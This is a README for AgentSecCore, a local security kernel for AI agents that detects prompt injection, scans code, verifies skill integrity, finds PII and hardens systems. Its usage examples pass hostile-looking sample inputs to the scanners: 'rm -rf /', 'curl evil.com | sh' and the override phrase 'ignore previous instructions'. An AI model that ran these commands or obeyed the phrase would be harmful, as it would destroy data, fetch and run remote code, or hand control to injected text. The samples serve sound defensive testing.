# AgentSecCore

AgentSecCore is an all-local security kernel for AI Agents. It runs entirely on the local machine with zero Token consumption, providing defense-in-depth: prompt injection detection, code scanning, skill integrity verification, PII detection, system hardening, and sandbox isolation.

## Overview

| Module | Description |
|--------|-------------|
| Prompt Scanner | Rule engine + ML classifier detecting prompt injection and jailbreak (4 modes: fast/standard/strict/multi_turn) |
| Code Scanner | Static analysis of bash/python code for dangerous operations (verdict: pass/warn/deny/error) |
| Skill Ledger | Ed25519-signed integrity tracking with 6-state lifecycle (pass/none/drifted/warn/deny/tampered) |
| PII Checker | Detects personal information and credentials in text (email, phone, ID, JWT, AccessKey, etc.) |
| Security Baseline | System hardening scan and remediation via loongshield backend |
| Sandbox | Syscall-level isolation for cosh command execution (seccomp + namespace) |
| Observability | Interactive event review with 4-level drill-down TUI |
| Security Events | Local event store for querying and aggregating security findings |

## Prerequisites

- Linux (x86_64 or aarch64)
- Python 3.11.6 (pinned)
- Root privileges for system-mode install

## Installation

```bash
# Recommended (system mode required)
sudo anolisa install agent-sec-core

# Alternative (Alinux, requires YUM repo)
sudo yum install agent-sec-core

# Source build (developers only)
cd src/agent-sec-core && make build-cli
```

## Quick Start

```bash
# System hardening scan
agent-sec-cli harden --scan --config agentos_baseline

# Scan code for security issues
agent-sec-cli scan-code --code 'rm -rf /' --language bash

# Prompt injection detection
agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"

# PII detection
agent-sec-cli scan-pii --text "Contact alice@example.com, card 4111111111111111"

# Skill integrity check
agent-sec-cli skill-ledger check /path/to/skill

# Security event summary
agent-sec-cli events --summary --last-hours 24
```

## Usage

### Prompt Scanner

Detects prompt injection, jailbreak, and malicious instructions. Uses rule engine (L1) + ML classifier (L2).

**Modes:**

| Mode | Layers | Latency | Use Case |
|------|--------|---------|----------|
| `fast` | L1 only | <5ms | Real-time chat |
| `standard` | L1+L2 | 20-80ms | Production (default) |
| `strict` | L1+L2+L3 | 50-200ms | High-security |
| `multi_turn` | L4 only | varies | Multi-turn intent detection (Ollama) |

```bash
# Standard scan (default mode)
agent-sec-cli scan-prompt --text "user input here"

# Fast mode (rules only)
agent-sec-cli scan-prompt --mode fast --text "user input"

# Multi-turn detection (JSON from stdin)
echo '{"history":[...],"current_query":"...","assistant_response":"..."}' | \
    agent-sec-cli scan-prompt --mode multi_turn

# From file (one prompt per line)
agent-sec-cli scan-prompt --input prompts.txt --format json

# Human-readable output
agent-sec-cli scan-prompt --text "hello" --format text

# Pre-download ML models (run once after install)
agent-sec-cli scan-prompt warmup
```

Model source: models are downloaded from ModelScope (Llama-Prompt-Guard-2-86M). Run `scan-prompt warmup` once after installation to eliminate cold-start latency.

### Code Scanner

Detects dangerous operations in bash and python code. Verdict enum: `pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or `pass`.

```bash
# Scan bash code (default language)
agent-sec-cli scan-code --code 'rm -rf /'

# Scan python code
agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python

# Use LLM engine (requires model backend)
agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
```

### Skill Ledger

OS-level skill integrity tracking with Ed25519 signatures and append-only version chain.

**States:**

| State | Meaning | Action |
|-------|---------|--------|
| pass | Files unchanged, signature valid, scan clean | Safe to use |
| none | Never scanned | Run `scan` or `certify` |
| drifted | Files changed since last certification | Re-scan |
| warn | Scan found low-risk issues | Review findings |
| deny | Scan found high-risk issues | Fix or disable |
| tampered | Signature verification failed | Security incident |

```bash
# Initialize keys and baseline scan
agent-sec-cli skill-ledger init

# Check integrity (no modification)
agent-sec-cli skill-ledger check /path/to/skill
agent-sec-cli skill-ledger check --all

# Run built-in scanners and sign
agent-sec-cli skill-ledger scan /path/to/skill
agent-sec-cli skill-ledger scan --all

# Import external findings
agent-sec-cli skill-ledger certify /path/to/skill \
    --findings /tmp/findings.json --scanner skill-vetter

# System health overview
agent-sec-cli skill-ledger status
agent-sec-cli skill-ledger status --verbose

# Audit version chain integrity
agent-sec-cli skill-ledger audit /path/to/skill --verify-snapshots

# List registered scanners
agent-sec-cli skill-ledger list-scanners

# Apply user decision
agent-sec-cli skill-ledger decide /path/to/skill --action allow

# Show latest active state
agent-sec-cli skill-ledger show /path/to/skill

# Export signed snapshot for review
agent-sec-cli skill-ledger export /path/to/skill --output /tmp/export/
```

### PII Checker

Detects personal information and credentials in text input.

```bash
# Scan text directly
agent-sec-cli scan-pii --text "Contact alice@example.com" --source manual

# Scan from stdin
echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json

# Scan from file
agent-sec-cli scan-pii --input ./sample.log --source user_input

# With redacted output
agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output

# Include low-confidence findings
agent-sec-cli scan-pii --text "some text" --include-low-confidence
```

### Security Baseline

System hardening via `agent-sec-cli harden` (wraps loongshield seharden on Alinux).

```bash
# Compliance scan (default: agentos_baseline profile)
agent-sec-cli harden --scan --config agentos_baseline

# Preview remediation (dry run)
agent-sec-cli harden --reinforce --dry-run --config agentos_baseline

# Execute remediation (requires root)
agent-sec-cli harden --reinforce --config agentos_baseline

# OpenClaw-specific baseline
agent-sec-cli harden --scan --level openclaw

# Show full downstream help
agent-sec-cli harden --downstream-help
```

### Observability

Interactive event review tool for auditing Agent behavior.

```bash
# Open interactive TUI (requires interactive terminal)
agent-sec-cli observability review

# Record an observability event (from plugin, via stdin)
echo '{"hook":"before_tool_call",...}' | agent-sec-cli observability record --stdin

# Print observability record JSON schema
agent-sec-cli observability schema

# Per-session debrief report
agent-sec-cli observability report --last
agent-sec-cli observability report --session-id <id> --format json
```

### Security Events

Query the local security event store.

```bash
# Recent events (table format, default)
agent-sec-cli events --last-hours 24

# JSON output
agent-sec-cli events --last-hours 24 --output json

# Filter by category
agent-sec-cli events --category prompt_scan

# Filter by time range
agent-sec-cli events --since 2026-01-01T00:00:00 --until 2026-01-02T00:00:00

# Count events
agent-sec-cli events --count --last-hours 24

# Breakdown by category
agent-sec-cli events --count-by category --last-hours 24

# Pagination
agent-sec-cli events --offset 50 --limit 20

# Security posture summary
agent-sec-cli events --summary
```

## Agent Framework Integration

### OpenClaw

Deploy via script:

```bash
# From installed path (RPM)
/opt/agent-sec/openclaw-plugin/scripts/deploy.sh

# From source
./openclaw-plugin/scripts/deploy.sh
```

After deployment, configure:

```bash
# Enable prompt scan blocking
openclaw config set plugins.entries.agent-sec.config.promptScanBlock true

# Enable code scan approval mode
openclaw config set plugins.entries.agent-sec.config.codeScanRequireApproval true

# Restart gateway to load
openclaw gateway restart
```

### Hermes

Deploy via script:

```bash
# From installed path (RPM)
/opt/agent-sec/hermes-plugin/scripts/deploy.sh

# From source
./hermes-plugin/scripts/deploy.sh
```

Plugin config at `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`:

```toml
[capabilities.code-scan]
enabled = true
timeout = 10
enable_block = false    # false=observe, true=block

[capabilities.pii-scan-user-input]
enabled = true
timeout = 10

[capabilities.skill-ledger]
enabled = true
timeout = 5
policy = "ask"          # ask (default) | warn | block | debug
```

### Copilot Shell (cosh)

The cosh extension is installed automatically during `make install` or via RPM. No manual enablement required — hooks are loaded at cosh startup.

Extension path:
- User install: `~/.copilot-shell/extensions/agent-sec-core/`
- RPM install: `/usr/share/anolisa/extensions/agent-sec-core/`

## FAQ

**Q: Does AgentSecCore consume Tokens?**

A: No. All processing is local. No external API calls, no Token cost.

**Q: What is the difference between `harden` and `loongshield`?**

A: `agent-sec-cli harden` is the ANOLISA unified entry point that wraps `loongshield seharden` with default configuration. On Alinux systems, both work; `harden` adds the `agentos_baseline` profile by default.

**Q: How do I update the ML model for prompt scanning?**

A: Run `agent-sec-cli scan-prompt warmup` again. It downloads the latest model from ModelScope.

**Q: What does Skill Ledger `tampered` mean?**

A: Files are unchanged but the digital signature verification failed — the manifest metadata itself may have been modified. Stop using the skill immediately and investigate.
